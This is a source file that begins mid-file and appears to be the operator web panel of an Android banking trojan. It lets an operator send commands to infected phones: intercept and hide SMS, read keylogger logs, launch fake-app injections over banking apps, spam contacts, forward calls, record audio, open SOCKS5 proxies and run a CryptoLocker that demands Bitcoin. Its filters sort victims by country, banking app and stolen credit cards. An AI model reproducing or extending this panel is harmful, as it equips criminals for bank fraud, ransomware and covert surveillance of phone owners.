			if($a>1) echo "<a style='margin-left:5px; border: 1px solid #000' class='btn btn-default' href='index.php?cont=bots&page=$a'>>$a<</a>";
		}else{
			if($a>1) echo "<a  style='margin-left:5px; border: 1px solid #000' class='btn btn-default' href='index.php?cont=bots&page=$a'>$a</a>";
		}


		echo "</center></br>";
?>

<div  class="modal fade modal_command" style="Height: 390px; Width: 340px; background: #1D1F24;	margin: 0px auto auto -180px;	padding: 10px;	border-radius: 5px;" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">

	  <button type="button"  style="margin-top:-10px; color:#fff" onclick='checkOFF()' class="close" data-dismiss="modal" aria-hidden="true">×</button>
		<div class="styled-select">
			ID Bots<select name="comboBox_imeis" id="comboBox_imeis" style="color: #337ab7; font-size: 13; height: 28px;background: #1D1F24">

			<input type='text' value='a' name='text_imei' id='text_imei' style='visibility:hidden'/></br>
			</select>

			Commands
				<select  name="comboBox_commands" id="comboBox_commands" onchange="showOption(this)" style='color: #337ab7; font-size: 13; height: 28px; background: #1D1F24'>
					<option value='null'>
					<option value='sentSMS'>Send SMS
					<option value='startUSSD'>Start USSD
					<option value='startApp'>Start Application
					<option value='replaceURL'>Replace URL Admin Panel/Forwarding
					<option value='getSMS'>Get All SMS
					<option value='getapps'>Get All Installed Applications
					<option value='getpermissions'>Get All Permissions
					<option value='getkeylogger'>Get Logs Keylogger
					<option value='startAlert'>Show Message Box
					<option value='startPush'>Show Push Notification
					<option value='startAutoPush'>Show Automatically Push Notification
					<option value='startinj'>Start Fake-Locker
					<option value='numberGO'>Get Numbers From Phone Book
					<option value='numberGOsendSMS'>Sending SMS to your Contacts
					<option value='spamsms'>Start Spam SMS
					<option value='RequestPermissionInj'>Request Permission For Injection
					<option value='RequestPermissionGPS'>Request Permission For Geolocation
					<option value='startaccessibility'>Start Accessibility Service
					<option value='startpermission'>Start Permission
					<option value='startforward'>Start Forward Calls
					<option value='stopforward'>Stop Forward Calls
					<option value='openbrowser'>Open Link in Browser
					<option value='openactivity'>Open Link in Activity
					<option value='cryptolocker'>CryptoLocker
					<option value='decryptolocker'>Decrypt File System
					<option value='recordsound'>Record Sound
					<option value='startsocks5'>Start Socks5
					<option value='stopsocks5'>Stop Socks5
					<option value='getIP'>Get IP Bot
					<option value='killBot'>Kill Bot
				</select>

			<div  id="div_sent_sms" name="div_sent_sms" style="visibility:hidden; margin-top:10px;">
			 Number<input type="text" name="text_number" id="text_number" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			 Text<input type="text" name="text_msg" id="text_msg" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>


			<div id="div_push" style="visibility:hidden; margin-top:-97px;">
			Title<input  type="text" name="title_push" id="title_push" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			Text<input  type="text" name="text_push" id="text_push" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_send_tel_book" style="visibility:hidden; margin-top:-97px;">
			Text<input  type="text" name="text_sms_tel_book" id="text_sms_tel_book" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_start_inj" style="visibility:hidden; margin-top:-43px;">
			Select name of the fake
			<select  name="comboBox_inj" id="comboBox_inj" style='color: #337ab7; font-size: 13; height: 28px;background: #1D1F24'>



			<?php

			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');
			$sql = "SELECT name,process FROM injection";


			foreach($connection->query($sql) as $row){
				$inj_name = $row['name'];
				$inj_process = $row['process'];
				$massivProc = explode(",", $inj_process);
				$inj_process = $massivProc[0];

				echo "<option value='$inj_process'>$inj_name";
			}
			?>
				</select>
			</div>

			<div  id="div_start_ussd" name="div_start_ussd" style="visibility:hidden; margin-top:-50px;">
			 USSD<input type="text" name="text_ussd" id="text_ussd" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_start_push" style="visibility:hidden; margin-top:-50px;">
			Title<input  type="text" name="titlePush" id="titlePush" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			Text<input  type="text" name="textPush" id="textPush" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>

			Icon
			<select  name="comboBox_push" id="comboBox_push" style='color: #337ab7; font-size: 13; height: 28px;background: #1D1F24'>
			<?php

			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');
			$sql = "SELECT name,process FROM injection";


			foreach($connection->query($sql) as $row){
				$inj_name = $row['name'];
				if (!preg_match("/Grabber/",$inj_name)){
					$inj_process = $row['process'];
					$massivProc = explode(",", $inj_process);
					$inj_process = $massivProc[0];
					echo "<option value='$inj_process'>$inj_name";
				}
			}
			?>
			</select>

			</div>

			<div id="div_startforward" style="visibility:hidden; margin-top:-140px;">
			Number<input  type="text" name="text_forward" id="text_forward" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_openbrowser" style="visibility:hidden; margin-top:-50px;">
			URL<input  type="text" name="text_openbrowser" id="text_openbrowser" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_openactivity" style="visibility:hidden; margin-top:-50px;">
			URL<input  type="text" name="text_openactivity" id="text_openactivity" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>



			<div id="div_start_app" style="visibility:hidden; margin-top:-45px;">
			Name Package Application<input  type="text" name="text_start_app" id="text_start_app" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_replace_url" style="visibility:hidden; margin-top:-50px;">
			URL<input  type="text" name="text_replace_url" id="text_replace_url" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_crypt" style="visibility:hidden; margin-top:-50px;">
			Encryption Key<input  type="text" name="text_enc_key" id="text_enc_key" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			Amount<input  type="text" name="text_enc_key" id="text_amount" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			Bitcoin<input  type="text" name="text_enc_key" id="text_btc" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_decrypt" style="visibility:hidden; margin-top:-142px;">
			Decryption Key<input  type="text" name="text_dec_key" id="text_dec_key" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_record_sound" style="visibility:hidden; margin-top:-50px;">
			Seconds<input  type="text" name="text_seconds" id="text_seconds" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_spamsms" style="visibility:hidden; margin-top:-50px;">
			Text<input  type="text" name="text_spam_n" id="text_spam_n" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<div id="div_socks5" style="visibility:hidden; margin-top:-50px;">
			Host<input  type="text" name="text_host_n" id="text_host_n" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			User<input  type="text" name="text_user_n" id="text_user_n" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			Password<input  type="text" name="text_pass_n" id="text_pass_n" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			Port<input  type="text" name="text_port_n" id="text_port_n" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;"></input>
			</div>

			<script type="text/javascript">
			  function showOption(el)
			  {
				   if(el.options[el.selectedIndex].value == "openactivity")//WebSocket
				  {
					   document.getElementById("div_openactivity").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_openactivity").style.visibility = "hidden";
				  }
				   if(el.options[el.selectedIndex].value == "openbrowser")//WebSocket
				  {
					   document.getElementById("div_openbrowser").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_openbrowser").style.visibility = "hidden";
				  }
				   if(el.options[el.selectedIndex].value == "startforward")//WebSocket
				  {
					   document.getElementById("div_startforward").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_startforward").style.visibility = "hidden";
				  }

				  if(el.options[el.selectedIndex].value == "sentSMS")//отправка смс
				  {
					   document.getElementById("div_sent_sms").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_sent_sms").style.visibility = "hidden";
				  }

				  if(el.options[el.selectedIndex].value == "startAlert")//alert
				  {
					   document.getElementById("div_push").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_push").style.visibility = "hidden";
				  }
				  if(el.options[el.selectedIndex].value == "numberGOsendSMS")//Рассылка СМС по телефонной книге
				  {
					   document.getElementById("div_send_tel_book").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_send_tel_book").style.visibility = "hidden";
				  }

				  if(el.options[el.selectedIndex].value == "startinj")//injection
				  {
					   document.getElementById("div_start_inj").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_start_inj").style.visibility = "hidden";
				  }
				  if(el.options[el.selectedIndex].value == "startUSSD")//USSD
				  {
					   document.getElementById("div_start_ussd").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_start_ussd").style.visibility = "hidden";
				  }
				  if(el.options[el.selectedIndex].value == "startPush")//Push
				  {
					   document.getElementById("div_start_push").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_start_push").style.visibility = "hidden";
				  }
				  if(el.options[el.selectedIndex].value == "startApp")//
				  {
					   document.getElementById("div_start_app").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_start_app").style.visibility = "hidden";
				  }
				  if(el.options[el.selectedIndex].value == "replaceURL")//
				  {
					   document.getElementById("div_replace_url").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_replace_url").style.visibility = "hidden";
				  }
				  if(el.options[el.selectedIndex].value == "cryptolocker")//
				  {
					   document.getElementById("div_crypt").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_crypt").style.visibility = "hidden";
				  }
				  if(el.options[el.selectedIndex].value == "decryptolocker")//
				  {
					   document.getElementById("div_decrypt").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_decrypt").style.visibility = "hidden";
				  }
				   if(el.options[el.selectedIndex].value == "recordsound")//
				  {
					   document.getElementById("div_record_sound").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_record_sound").style.visibility = "hidden";
				  }

					if(el.options[el.selectedIndex].value == "spamsms")//
				 {
						document.getElementById("div_spamsms").style.visibility = "visible";
				 }else
				 {
					 document.getElementById("div_spamsms").style.visibility = "hidden";
				 }

				 if(el.options[el.selectedIndex].value == "startsocks5")//
				{
					 document.getElementById("div_socks5").style.visibility = "visible";
				}else
				{
					document.getElementById("div_socks5").style.visibility = "hidden";
				}

			  }
			</script>

			<input type='submit' value='Add Command' id="bth_add_command" name='bth_add_command' onclick='sendDataCommand()'   class='btn btn-outline-success' style='Width:100%; Height: 30px; font-size: 14; margin-top:15px;' data-dismiss="modal" aria-hidden="true"/>

			<!--</form>-->
		</div>
</div>

<div class="modal fade logs" id = "log_modal"  style="margin-left:0px;">
	<div id = "modal_l">
	<a id="exit" data-dismiss="modal" aria-hidden="true" onclick="document.getElementById('logsTextArea').remove();" style="margin-left:97%; cursor: pointer; color: Red;">X</a>
		<div class="styled-select" id="textArea"></div>
	</div>
</div>



	<div  class="modal fade settings" style="Height: 622px; background: #1D1F24;	margin: 0px auto auto -250px;	padding: 10px;	border-radius: 5px;" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
	<button type="button"  style="margin-top:-10px; color:#fff" class="close" data-dismiss="modal" aria-hidden="true">×</button>
		<div class="styled-select">

		<?php
		$connection4 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection4->exec('SET NAMES utf8');
		$sql4 = "SELECT * FROM settings";


		echo "<center><a id='AstatusSettings'><h5 id='statusSettings'>Settings are not active, wait until the bot updates them..</h5></a></center>";

		echo "ID Bots<select name='comboBox_imeis2' id='comboBox_imeis2' style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;''>";

		echo "</select> ";
		echo "</br></br>";
		//-----------------------
		echo "<h5><a>Time of the bot:</a> <a style='color: Red;' id='idSeconds'></a> <a> seconds</a></h5>";
		echo "<a><h5>Injections</h5></a>";
		$sql4 = "SELECT * FROM injection";
		$countInject = 0;

		echo "<div style='width:100%; height:150px; background: #1D1F24; border: 1px solid #C1C1C1; overflow: auto;'>";
		foreach($connection4->query($sql4) as $row){
			$countInject++;
			$ID_inj = $row['id'];
			$name_inj = $row['name'];

			echo "<input type='checkbox' id='check_set' name='check_set[]' value='$ID_inj' style='margin-top: -10px;'>$name_inj</input></br>";
		}
		echo "</div>";

		echo "All injections: $countInject";
		echo "</br></br>";

		echo "<input type=checkbox name=check_record id='check_record' value='1' style='margin-top:0px;'> Record Sound </input>";
		echo "<input  type='text' name='id_seconds' id='id_seconds' style='color: #337ab7; background: #1D1F24; width: 10%; font-size: 13; height: 22px; padding: 5px; font-family: Consolas; border: 1px solid #ccc; border-radius: 8px'></input> Seconds";
		echo "</br>";
		echo "<input type=checkbox name=lookscreen id='lookscreen' value='1' style='margin-top:0px;'> Look Screen</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_set_v id='chkinterceptSMS' value='1' style='margin-top:0px;'> Interception SMS</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_set_d id='chkhideSMS' value='1' style='margin-top:0px;'> Hidden SMS interception</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_set_network id='chknetwork' value='1' style='margin-top:0px;' > Geolocation NETWORK</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_set_gps id='chkgps' value='1' style='margin-top:0px;'> Geolocation GPS</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_foreground id='check_foreground' value='1' style='margin-top:0px;'> Foreground Service</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_keylogger id='check_keylogger' value='1' style='margin-top:0px;'> Keylogger</input>";
		?>
		<input type='text' name='text_imei_set' id='text_imei_set'style='visibility:hidden'/>
		</br>
		<input type='submit' value='Save settings' onclick="saveSetting()" id="bth_add_set" name='bth_add_set'   class='btn btn-outline-success' style='Width:100%; Height: 30px; font-size: 14; margin-top:20px;' data-dismiss="modal" aria-hidden="true"/>
	</div>

    </div>
 <div  class="modal fade sorting" style="Width:400px; Height: 460px; background: #1D1F24;	margin: 0px auto auto -180px;	padding: 10px;	border-radius: 5px;" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">

        <button type="button"  style="margin-top:-10px; color:#fff" class="close" data-dismiss="modal" aria-hidden="true">×</button>
       <form name="modal_set"  method="POST">
		<div class="styled-select">

				<?php
				$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
				$connection->exec('SET NAMES utf8');
				$sql = "SELECT * FROM kliets";

				/****Ограничение по тегам****/
				$userRights = new users_right;
				$tags = explode("|", $userRights->getPrivateTags());
				$thisTag = explode(",", $tags[0]);
				$privateTag = explode(",", $tags[1]);
				/****************************/

				$massivCountry="";
				$massivVersion="";
				$massivPack="";
				foreach($connection->query($sql) as $row)
				{
				$version_apk = $row['version_apk'];
				$country = $row['country'];
				$packbank = $row['bank'];

				if($_SESSION['panel_right']!="admin")//Ограничение по тегам
				{
					$boolContinue=true;
					if($tags[0]!=",")
					{
						foreach($thisTag as $tag)
						{
							if($version_apk == $tag)
							{
								if($tag!="")
								{
									$boolContinue=false;
									break;
								}
							}
						}
						if($boolContinue)continue;

					}
					else
					{
						foreach($privateTag as $tag)
						{
							if($version_apk == $tag)
							{
								if($tag!="")
								{
									$boolContinue=false;
									break;
								}
							}
						}
						if(!$boolContinue)continue;
					}
				}//---------------

				if(!preg_match("/$country/",$massivCountry))$massivCountry="$massivCountry/$country";

				if(!preg_match("/$version_apk/",$massivVersion))$massivVersion="$massivVersion/$version_apk";
				if(!preg_match("/$packbank/",$massivPack))$massivPack="$massivPack/$packbank";
				}
				?>

				Condition bots
				<select  name="sort_kat" style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;'>
					<option value='all'>All
					<option value='online'>Online
					<option value='offline'>Offline
					<option value='kill'>Offline more than 2 days
				</select>
				</br></br>

				Country
				<select  name="sortCountry" style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;'>
					<option value='all'>All

					<?php
					$massivC = explode("/", $massivCountry);

					foreach($massivC as $mc)
					{
						if($mc!="")echo "<option value='$mc'>$mc";
					}
					?>
				</select>
				</br></br>
				Credit Cards/Injections
				<select  name="color" style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;'>
					<option value='all'>All
					<option value='cards'>Credit Cards
					<option value='inject'>Injections
				</select>
				</br></br>
				Tag
				<select  name="versions" style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;'>
					<option value='all'>All

					<?php
					$massivV = explode("/", $massivVersion);

					foreach($massivV as $mv){
						if($mv!="")echo "<option value='$mv'>$mv";
					}
					?>
				</select>
				</br></br>
				Package name
				<select  name="packBank" style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;'>
					<option value='all'>All

					<?php
					$massivPack = str_replace(",","/",$massivPack);
					$massivP = explode("/", $massivPack);
					$heshinj = " ";
					foreach($massivP as $mv){

						if($mv!=""){
							if (!preg_match("/$mv/",$heshinj)){
								echo "<option value='$mv'>$mv";
								$heshinj="$heshinj|$mv|";
							}

						}
					}
					?>
				</select>
				</br></br>
				Banking app
				<select  name="bank" style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: Consolas; border: 1px solid #ccc;'>
					<option value='all'>All
					<option value='on'>Bank App
					<option value='off'>No Bank App
				</select>

				<center>

				<input type='submit' value='Sorting' id="bth_add_sort" name='bth_add_sort'   class='btn btn-outline-success' style='Width:100%; Height: 30px; font-size: 14; margin-top:20px;'/>

				</center>
		</div>
		</form>
    </div>



</div>

<script>
//------------Обновление контента таблиц ----
		function refreshIconLogBot(imei){

			  $.ajax({
			  url: "application/get/contentTable.php?imeis="+imei,
			  cache: false,
			   success: function(data){
						var arrayBots = data.split('|');

						//IMEI/онлайн/скрин/спец возможности/скрытый переват смс/инжи/геолокация/карты/инжекты/логи
						for(var i=0;i<arrayBots.length;i++){
							if(arrayBots[i]!=''){
								var arrayElement = arrayBots[i].split(':');

								for(var k=0;k<arrayElement.length;k++){

									var imei = arrayElement[0];
									var online = arrayElement[1];
									var screen = arrayElement[2];
									var accessibility = arrayElement[3];
									var interceptSMS = arrayElement[4];
									var inject = arrayElement[5];
									var gps = arrayElement[6];
									var cards_icon = arrayElement[7];
									var inj_icon = arrayElement[8];
									var log_icon = arrayElement[9];

									//-------online------
									var srcOnline = '';
									if(online==1){
										srcOnline = 'images/icons/offline.png';
									}else if(online==2){
										srcOnline = 'images/icons/kill.png';
									}else if(online==0){
										srcOnline = 'images/icons/online.png';
									}

									//------screen------
									var srcScreen = '';
									if(screen==1){
										srcScreen = 'images/icons/V.png';
									}else{
										srcScreen = 'images/icons/X.png';
									}
									//-----accessibility-----
									var srcAccessibility = '';
									if(accessibility==1){
										srcAccessibility = 'images/icons/juk_v.png';
									}else{
										srcAccessibility = 'images/icons/juk_x.png';
									}
									//-----hide sms-----
									var srcHideSMS = '';
									if(interceptSMS==1){
										srcHideSMS = 'images/icons/sms_v.png';
									}else{
										srcHideSMS = 'images/icons/sms_x.png';
									}
									//-----Inject-----
									var srcInject = '';
									if(inject==1){
										srcInject = 'images/icons/inj_v.png';
									}else{
										srcInject = 'images/icons/inj_off2.png';
									}
									//-----gps------
									var srcGps = '';
									if(gps==1){
										srcGps = 'images/icons/geolocation_v.png';
									}else{
										srcGps = 'images/icons/geolocation_x.png';
									}
									//-----cardsIcon------
									var srcCardsIcon = '';
									if(cards_icon==1){
										srcCardsIcon = 'images/icons/bank_on.png';
									}else{
										srcCardsIcon = 'images/icons/bank_off.png';
									}
									//-----injectIcon----
									var srcInjectIcon = '';
									if(inj_icon==1){
										srcInjectIcon = 'images/icons/inj_on.png';
									}else{
										srcInjectIcon = 'images/icons/inj_off.png';
									}
									//-----LogsIcon----
									var srcLogsIcon = '';
									if(log_icon==1){
										srcLogsIcon = 'images/icons/log_on.png';
									}else if(log_icon==2){
										srcLogsIcon = 'images/icons/log_on_g.png';
									}else{
										srcLogsIcon = 'images/icons/log_off.png';
									}

									document.getElementById('lastConnectIMG'+imei).src = srcOnline;
									document.getElementById('Screen'+imei).src = srcScreen;
									document.getElementById('Accessibility'+imei).src = srcAccessibility;
									document.getElementById('interceptingSMS'+imei).src = srcHideSMS;
									document.getElementById('injections'+imei).src = srcInject;
									document.getElementById('geolocations'+imei).src = srcGps;
									document.getElementById('cards'+imei).src = srcCardsIcon;
									document.getElementById('inj'+imei).src = srcInjectIcon;
									document.getElementById('logs'+imei).src = srcLogsIcon;
								}
							}
						}
			   }
			 });
		   }


		   function refreshContentTable(){

			   var getImeis = document.getElementById("allimei").value;

			  $.ajax({
			  url: "application/get/contentTable.php?imeis="+getImeis,
			  cache: false,
			   success: function(data){
						var arrayBots = data.split('|');

						//IMEI/онлайн/скрин/спец возможности/скрытый переват смс/инжи/геолокация/карты/инжекты/логи
						for(var i=0;i<arrayBots.length;i++){
							if(arrayBots[i]!=''){
								var arrayElement = arrayBots[i].split(':');

								for(var k=0;k<arrayElement.length;k++){

									var imei = arrayElement[0];
									var online = arrayElement[1];
									var screen = arrayElement[2];
									var accessibility = arrayElement[3];
									var interceptSMS = arrayElement[4];
									var inject = arrayElement[5];
									var gps = arrayElement[6];
									var cards_icon = arrayElement[7];
									var inj_icon = arrayElement[8];
									var log_icon = arrayElement[9];

									//-------online------
									var srcOnline = '';
									if(online==1){
										srcOnline = 'images/icons/offline.png';
									}else if(online==2){
										srcOnline = 'images/icons/kill.png';
									}else if(online==0){
										srcOnline = 'images/icons/online.png';
									}

									//------screen------
									var srcScreen = '';
									if(screen==1){
										srcScreen = 'images/icons/V.png';
									}else{
										srcScreen = 'images/icons/X.png';
									}
									//-----accessibility-----
									var srcAccessibility = '';
									if(accessibility==1){
										srcAccessibility = 'images/icons/juk_v.png';
									}else{
										srcAccessibility = 'images/icons/juk_x.png';
									}
									//-----hide sms-----
									var srcHideSMS = '';
									if(interceptSMS==1){
										srcHideSMS = 'images/icons/sms_v.png';
									}else{
										srcHideSMS = 'images/icons/sms_x.png';
									}
									//-----Inject-----
									var srcInject = '';
									if(inject==1){
										srcInject = 'images/icons/inj_v.png';
									}else{
										srcInject = 'images/icons/inj_off2.png';
									}
									//-----gps------
									var srcGps = '';
									if(gps==1){
										srcGps = 'images/icons/geolocation_v.png';
									}else{
										srcGps = 'images/icons/geolocation_x.png';
									}
									//-----cardsIcon------
									var srcCardsIcon = '';
									if(cards_icon==1){
										srcCardsIcon = 'images/icons/bank_on.png';
									}else{
										srcCardsIcon = 'images/icons/bank_off.png';
									}
									//-----injectIcon----
									var srcInjectIcon = '';
									if(inj_icon==1){
										srcInjectIcon = 'images/icons/inj_on.png';
									}else{
										srcInjectIcon = 'images/icons/inj_off.png';
									}
									//-----LogsIcon----
									var srcLogsIcon = '';
									if(log_icon==1){
										srcLogsIcon = 'images/icons/log_on.png';
									}else if(log_icon==2){
										srcLogsIcon = 'images/icons/log_on_g.png';
									}else{
										srcLogsIcon = 'images/icons/log_off.png';
									}

									document.getElementById('lastConnectIMG'+imei).src = srcOnline;
									document.getElementById('Screen'+imei).src = srcScreen;
									document.getElementById('Accessibility'+imei).src = srcAccessibility;
									document.getElementById('interceptingSMS'+imei).src = srcHideSMS;
									document.getElementById('injections'+imei).src = srcInject;
									document.getElementById('geolocations'+imei).src = srcGps;
									document.getElementById('cards'+imei).src = srcCardsIcon;
									document.getElementById('inj'+imei).src = srcInjectIcon;
									document.getElementById('logs'+imei).src = srcLogsIcon;
								}
							}
						}
			   }
			 });
		   }
		   //refreshContentTable();
           /* setInterval('refreshContentTable()',3000);  */
</script>
<?php } ?>

<?php

function getTimeConnect($date){
	$date_sec = strtotime($date);
	$date1 = date('Y-m-d H:i:s');
	$date_sec1 = strtotime($date1);
	$sek = $date_sec1 - $date_sec;
	$time = new DateTime('@'.$sek);

	$date = $time->format('d');
	$color = "";
	if($date==2){
		$color = "orange";
		return "<a style='color:$color'>".($date-1)." day</a>";
	}
	if($date>2){
		if($date>=3)$color = "#525050";//--dead--
		return "<a style='color:$color'>".($date-1)." days</a>";
	}

	$date = $time->format('H');
	if($date==1){
		$color = "orange";
		return "<a style='color:$color'>".$date." hour</a>";
	}
	if($date>1){
		$color = "orange";
		return "<a style='color:$color'>".$date." hours</a>";
	}
	$date = $time->format('i');
	if($date>=1){
		if($date>=2){
			$color = "orange";
		}else{
			$color = "#00FF00";//"green";
		}
		return "<a style='color:$color'>".$date." min</a>";
	}

	$date = $time->format('s');
	if($date>=1){
		$color="#00FF00";//"green";
		return "<a style='color:$color'>".$date." sek</a>";
	}
}

?>
